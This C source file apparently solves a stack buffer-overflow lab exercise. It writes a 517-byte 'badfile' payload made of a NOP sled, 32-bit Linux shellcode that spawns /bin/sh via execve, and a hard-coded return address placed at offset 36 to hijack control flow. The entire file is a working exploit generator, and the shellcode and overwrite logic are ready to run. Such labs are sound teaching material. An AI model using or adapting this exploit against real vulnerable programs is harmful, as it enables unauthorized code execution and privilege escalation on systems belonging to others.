#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =
  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x50"                 /* pushl   %eax                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x89\xe1"             /* movl    %esp,%ecx              */
  "\x99"                 /* cdq                            */
  "\xb0\x0b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */
;

#define BUFFER_SIZE 517
#define OFFSET 36        /* return address is at EBP+4, so offset = 32+4 = 36 bytes */
#define NOP 0x90         /* NOP */

int main(int argc, char **argv) {
    char buffer[BUFFER_SIZE];
    FILE *badfile;
    int i;
    
    /* initialize with NOPs */
    memset(buffer, NOP, BUFFER_SIZE);
    
    /* known addresses */
    unsigned long buffer_addr = 0xbffff448;
    
    /* shellcode in middle of buffer to avoid corruption at edges */
    int shellcode_pos = 200;
    memcpy(buffer + shellcode_pos, shellcode, sizeof(shellcode) - 1);
    
    unsigned long retaddr = buffer_addr + shellcode_pos;  /* Point directly to shellcode */
    
    /* place return address at offset position */
    *((unsigned long *)(buffer + OFFSET)) = retaddr;
    
    /* ensure proper size and not null-terminated */
    badfile = fopen("./badfile", "wb");  /* binary mode */
    fwrite(buffer, BUFFER_SIZE, 1, badfile);
    fclose(badfile);
    
    printf("- Buffer size: %d bytes (exact size matters)\n", BUFFER_SIZE);
    printf("- Return address offset: %d bytes\n", OFFSET);
    printf("- Shellcode at position %d\n", shellcode_pos);
    printf("- Return address: 0x%lx (points to shellcode)\n", retaddr);
    printf("- Binary file output (no null termination)\n");
    
    return 0;
}
